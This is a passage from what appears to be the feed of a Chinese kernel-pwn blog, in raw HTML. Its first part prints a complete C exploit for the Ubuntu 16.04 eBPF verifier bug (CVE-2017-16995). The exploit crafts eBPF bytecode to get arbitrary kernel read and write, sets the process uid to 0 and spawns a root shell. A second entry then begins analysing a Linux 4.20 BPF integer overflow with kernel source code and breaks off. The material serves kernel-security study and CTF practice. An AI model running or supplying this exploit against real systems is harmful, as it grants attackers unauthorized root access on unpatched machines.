class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Ubuntu 16.04.4 kernel priv esc</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * all credits to @bleidl</span></span><br><span class="line"><span class="comment"> * - vnik</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Tested on:</span></span><br><span class="line"><span class="comment">// 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64</span></span><br><span class="line"><span class="comment">// if different kernel adjust CRED offset + check kernel stack size</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/un.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PHYS_OFFSET 0xffff880000000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_OFFSET 0x9b8 <span class="comment">// 0x5f8</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UID_OFFSET 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOG_BUF_SIZE 65536</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROGSIZE 328 <span class="comment">//-32</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> sockets[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> mapfd, progfd;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *__prog = <span class="string">&quot;\xb4\x09\x00\x00\xff\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;\x55\x09\x02\x00\xff\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x18\x19\x00\x00\x03\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;\x62\x0a\xfc\xff\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x79\x06\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;\x62\x0a\xfc\xff\x01\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x79\x07\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;\x62\x0a\xfc\xff\x02\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x79\x08\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\xbf\x02\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x55\x06\x03\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x79\x73\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x7b\x32\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x55\x06\x02\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x7b\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x7b\x87\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> bpf_log_buf[LOG_BUF_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_prog_load</span><span class="params">(<span class="keyword">enum</span> bpf_prog_type prog_type,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">const</span> struct bpf_insn *insns, <span class="keyword">int</span> prog_len,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">const</span> <span class="keyword">char</span> *license, <span class="keyword">int</span> kern_version)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">.prog_type = prog_type,</span><br><span class="line">.insns = (__u64)insns,</span><br><span class="line">.insn_cnt = prog_len / <span class="keyword">sizeof</span>(struct bpf_insn),</span><br><span class="line">.license = (__u64)license,</span><br><span class="line">.log_buf = (__u64)bpf_log_buf,</span><br><span class="line">.log_size = LOG_BUF_SIZE,</span><br><span class="line">.log_level = <span class="number">1</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">attr.kern_version = kern_version;</span><br><span class="line"></span><br><span class="line">bpf_log_buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_create_map</span><span class="params">(<span class="keyword">enum</span> bpf_map_type map_type, <span class="keyword">int</span> key_size, <span class="keyword">int</span> value_size,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">int</span> max_entries)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">.map_type = map_type,</span><br><span class="line">.key_size = key_size,</span><br><span class="line">.value_size = value_size,</span><br><span class="line">.max_entries = max_entries&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_update_elem</span><span class="params">(<span class="keyword">uint64_t</span> key, <span class="keyword">uint64_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">.map_fd = mapfd,</span><br><span class="line">.key = (__u64)&amp;key,</span><br><span class="line">.value = (__u64)&amp;value,</span><br><span class="line">.flags = <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_lookup_elem</span><span class="params">(<span class="keyword">void</span> *key, <span class="keyword">void</span> *value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">.map_fd = mapfd,</span><br><span class="line">.key = (__u64)key,</span><br><span class="line">.value = (__u64)value,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __exit(<span class="keyword">char</span> *err)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;error: %s\n&quot;</span>, err);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">prep</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), <span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">long</span>), <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span> (mapfd &lt; <span class="number">0</span>)</span><br><span class="line">__exit(strerror(errno));</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;mapfd finished&quot;</span>);</span><br><span class="line">progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">   (struct bpf_insn *)__prog, PROGSIZE, <span class="string">&quot;GPL&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (progfd &lt; <span class="number">0</span>)</span><br><span class="line">__exit(strerror(errno));</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;bpf_prog_load finished&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, sockets))</span><br><span class="line">__exit(strerror(errno));</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;socketpair finished&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (setsockopt(sockets[<span class="number">1</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, <span class="keyword">sizeof</span>(progfd)) &lt; <span class="number">0</span>)</span><br><span class="line">__exit(strerror(errno));</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;setsockopt finished&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">writemsg</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">ssize_t</span> n = write(sockets[<span class="number">0</span>], buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (n &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">perror(<span class="string">&quot;write&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (n != <span class="keyword">sizeof</span>(buffer))</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;short write: %lu\n&quot;</span>, n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __update_elem(a, b, c) \</span></span><br><span class="line"><span class="meta">bpf_update_elem(0, (a));   \</span></span><br><span class="line"><span class="meta">bpf_update_elem(1, (b));   \</span></span><br><span class="line"><span class="meta">bpf_update_elem(2, (c));   \</span></span><br><span class="line"><span class="meta">writemsg();</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">uint64_t</span> <span class="title">get_value</span><span class="params">(<span class="keyword">int</span> key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">uint64_t</span> value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bpf_lookup_elem(&amp;key, &amp;value))</span><br><span class="line">__exit(strerror(errno));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> __get_fp(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">__update_elem(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> get_value(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> __read(<span class="keyword">uint64_t</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">__update_elem(<span class="number">0</span>, addr, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> get_value(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __write(<span class="keyword">uint64_t</span> addr, <span class="keyword">uint64_t</span> val)</span><br><span class="line">&#123;</span><br><span class="line">__update_elem(<span class="number">2</span>, addr, val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">uint64_t</span> <span class="title">get_sp</span><span class="params">(<span class="keyword">uint64_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> addr &amp; ~(<span class="number">0x4000</span> - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">pwn</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">uint64_t</span> fp, sp, task_struct, credptr, uidptr;</span><br><span class="line"></span><br><span class="line">fp = __get_fp();</span><br><span class="line"><span class="keyword">if</span> (fp &lt; PHYS_OFFSET)</span><br><span class="line">__exit(<span class="string">&quot;bogus fp&quot;</span>);</span><br><span class="line"></span><br><span class="line">sp = get_sp(fp);</span><br><span class="line"><span class="keyword">if</span> (sp &lt; PHYS_OFFSET)</span><br><span class="line">__exit(<span class="string">&quot;bogus sp&quot;</span>);</span><br><span class="line"></span><br><span class="line">task_struct = __read(sp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (task_struct &lt; PHYS_OFFSET)</span><br><span class="line">__exit(<span class="string">&quot;bogus task ptr&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;task_struct = %lx\n&quot;</span>, task_struct);</span><br><span class="line"></span><br><span class="line">credptr = __read(task_struct + CRED_OFFSET); <span class="comment">// cred</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (credptr &lt; PHYS_OFFSET)</span><br><span class="line">__exit(<span class="string">&quot;bogus cred ptr&quot;</span>);</span><br><span class="line"></span><br><span class="line">uidptr = credptr + UID_OFFSET; <span class="comment">// uid</span></span><br><span class="line"><span class="keyword">if</span> (uidptr &lt; PHYS_OFFSET)</span><br><span class="line">__exit(<span class="string">&quot;bogus uid ptr&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;uidptr = %lx\n&quot;</span>, uidptr);</span><br><span class="line">__write(uidptr, <span class="number">0</span>); <span class="comment">// set both uid and gid to 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (getuid() == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;spawning root shell\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__exit(<span class="string">&quot;not vulnerable?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">prep();</span><br><span class="line">pwn();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221010170323134.png"                      alt="image-20221010170323134"                ></p><p>这里exp我是直接用的原文的exp，因为理解漏洞之后操作起来就比较简单了，主要麻烦的就是构造eBPF指令</p><hr><p>题目放在:<a class="link"   href="https://github.com/196082/196082" >https://github.com/196082/196082<i class="fas fa-external-link-alt"></i></a></p><p>参考文章:<a class="link"   href="http://p4nda.top/2019/01/18/CVE-2017-16995/#do-check" >http://p4nda.top/2019/01/18/CVE-2017-16995/#do-check<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这一篇是作为ebpf的入门文章，所以会稍微介绍一下指令集，寄存器。可能篇幅略长。&lt;/p&gt;
&lt;h2 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a&gt;漏洞简介&lt;/h2&gt;&lt;p&gt;该漏洞最早是由17年12月2</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    <category term="CVE" scheme="https://cv196082.gitee.io/categories/kernel-pwn/CVE/"/>
    
    
    <category term="ebpf" scheme="https://cv196082.gitee.io/tags/ebpf/"/>
    
  </entry>
  
  <entry>
    <title>Linux kernel 4.20 BPF 整数溢出漏洞</title>
    <link href="https://cv196082.gitee.io/2022/10/02/Linux-kernel-4-20-BPF-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"/>
    <id>https://cv196082.gitee.io/2022/10/02/Linux-kernel-4-20-BPF-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</id>
    <published>2022-10-02T06:51:24.000Z</published>
    <updated>2022-10-02T06:51:57.434Z</updated>
    
    <content type="html"><![CDATA[<p>题目会放在:<a class="link"   href="https://github.com/196082/196082" >https://github.com/196082/196082<i class="fas fa-external-link-alt"></i></a></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>kernel中的bpf模块主要用于用户态定义数据包过滤方法，如常见的抓包工具都基于此实现，并且用户态的Seccomp功能也与此功能相似。</p><h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3><p>该漏洞存在于BPF_MAP_CREATE功能中，并且可以看到处理的函数是map_create。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(bpf, <span class="keyword">int</span>, cmd, <span class="keyword">union</span> bpf_attr __user *, uattr, <span class="keyword">unsigned</span> <span class="keyword">int</span>, size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">  <span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sysctl_unprivileged_bpf_disabled &amp;&amp; !capable(CAP_SYS_ADMIN))</span><br><span class="line">    <span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">  err = bpf_check_uarg_tail_zero(uattr, <span class="keyword">sizeof</span>(attr), size);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">  size = <span class="keyword">min_t</span>(u32, size, <span class="keyword">sizeof</span>(attr));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* copy attributes from user space, may be less than sizeof(bpf_attr) */</span></span><br><span class="line">  <span class="keyword">if</span> (copy_from_user(&amp;attr, uattr, size) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">  err = security_bpf(cmd, &amp;attr, size);</span><br><span class="line">  <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> BPF_MAP_CREATE:</span><br><span class="line">      err = map_create(&amp;attr);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> BPF_MAP_LOOKUP_ELEM:</span><br><span class="line">      err = map_lookup_elem(&amp;attr);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> BPF_MAP_UPDATE_ELEM:</span><br><span class="line">      err = map_update_elem(&amp;attr);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>可以看到下面使用find_and_alloc_map函数创建一个map结构体，并为其分配编号，然后寻找出来生成的map。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span 